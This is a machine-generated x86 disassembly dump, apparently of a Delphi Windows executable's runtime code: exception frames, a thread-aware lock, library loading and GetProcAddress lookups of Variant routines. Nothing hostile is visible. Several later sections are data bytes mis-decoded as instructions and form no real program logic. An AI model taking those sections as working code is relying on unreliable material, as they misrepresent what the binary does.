jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c570
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce3e
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f90
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_40448c
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4042ec
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_40422c
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_40448c
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404234
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40422c
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_40448c
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404234
jmp r-xdata
sub_40ce50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cee0
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b0b0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cee7
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
sub_40cf38
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_40881c
mov [ rw-data ] eax
sub_40cfbc
push ebx
push esi
push edi
push ebp
call sub_4035a8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4027ac
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_40320c
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_40d024
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d00c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d0ac
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407e6c
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cfac
mov [ ebp ] eax
sub_40d0ac
push ebx
mov ebx eax
mov eax ebx
call sub_40d00c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cfac
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d0ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40d160
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_40d1ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_40321c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_40d1ec
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d1a8
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d024
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cfb4
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cf94
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cfb4
test eax eax
je r-xdata
mov eax edi
call sub_40d1a8
test bl bl
je r-xdata
mov eax edi
call sub_40d1dc
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cf94
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cfa0
sub_40d288
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d024
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cfb4
mov eax ebx
call sub_40d1c0
mov eax ebx
call sub_40d1b4
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d09c
sub_40d2d8
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d024
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d1cc
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cfa0
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cf94
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d1cc
mov eax esi
call sub_40d1c0
sub_40d344
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d024
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d09c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cf94
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d1c0
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d1c0
sub_40d3bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d3e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d457
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_40599c
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d45e
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032d0
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d3bc
test al al
jne r-xdata
mov al 0x1
sub_40d478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d4ea
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d4cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40442c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4d3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d79d
int1
inc esi
add al ch
inc di
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb90f ] cl
push 0x47
add [ eax ] al
int1
inc esi
add [ eax ] bl
inc di
add [ eax ] al
add [ eax ] al
add [ eax - 0xf ] ah
inc esi
add [ eax ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d941
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d948
retn
mov eax rw-data
call sub_40d3ac
call sub_40cf18
call sub_40c04c
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40bb24 ]
call sub_404a20
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
call sub_403f6c
mov eax rw-data
mov edx [ r-xdata ]
call sub_4052f0
mov eax rw-data
mov edx [ r-xdata ]
call sub_4052f0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_404678
mov eax rw-data
call sub_403f6c
sub_40d94c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d9b4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9bb
retn
mov eax r-xdata
call sub_403d18
mov eax r-xdata
call sub_403d40
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bfc8
call sub_40c0cc
call sub_40cf38
call sub_40c99c
mov eax rw-data
mov edx r-xdata
call sub_403fc0
sub_40d9f4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40da48
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40daa2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4083d0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daa9
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40dab4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db0e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409768
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db15
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40db20
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db7a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40973c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db81
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40db8c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbe6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b024
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbed
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40dbf8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc52
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409794
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc59
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40dc64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dcd1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4084dc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcd8
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_40dce4
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dd44
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4096b4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047c4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd4b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40dd54
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40ddb4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a7b0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047c4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddbb
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40ddc4
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de28
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408578
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047c4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de2f
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40de78
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dea4
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d9f4
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da24
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da24
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da30
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da3c
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da48
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dab4
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db20
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db8c
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbf8
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc64
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dce4
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd54
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ddc4
mov eax r-xdata
call sub_40de78
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e1b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e1d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1dc
retn
sub_40e32a
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push esi
popad
jb r-xdata
jecxz r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] ch
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x1e ] al
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + edx * 2 + 0x41 ] dh
add al cl
push ecx
inc ecx
add [ ecx + edx * 2 ] al
inc ecx
add [ eax ] bh
push ecx
inc ecx
add [ eax ] bl
push ecx
inc ecx
add [ edx * 2 + 0x51000041 ] ah
inc ecx
add [ eax - 0x1fffbeb4 ] ch
dec esp
inc ecx
add [ ebp + ecx * 2 + 0x41 ] ch
add [ edx + ebp ] bl
inc eax
add [ edx + ebp ] bl
inc eax
add [ esp + ecx * 2 + 0x514c0041 ] bl
inc ecx
add [ ecx * 2 + 0x4d280041 ] dh
inc ecx
add [ eax ] dl
push edx
inc ecx
add al ch
push edi
inc ecx
add ah dh
push edi
inc ecx
add al dl
push edi
inc ecx
add ah bl
push edi
inc ecx
add [ esi ] dl
push esp
dec ecx
outsb
jbe r-xdata
add [ esi - 0x1d ] al
inc eax
add [ ebx - 0x1d ] dl
inc eax
add [ eax - 0x1d ] ah
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx + 0x5c ] dl
mov dh 0x1c

int3
jo r-xdata
imul esp [ ebp + 0x61 ] 0x62
insb
push esi
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
jb r-xdata
outsd
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] dl
add [ eax ] al
inc esp
jpe r-xdata
popad
jb r-xdata
push esi
xor ch ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in eax 0x40
jb r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] bl
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
add [ eax ] al
add [ eax ] al
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
jo r-xdata
popad
outsb
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch ah
inc eax
nop
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
out 0x40 al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
rcl [ ebp + 0x40 ] 0x0
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
popad
jae r-xdata
inc ebx
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ah
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
jns r-xdata
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0040 ] cl
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
je r-xdata
popad
inc eax
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax ] al
add [ edx + edi * 2 + 0x40 ] al
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
inc esp
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
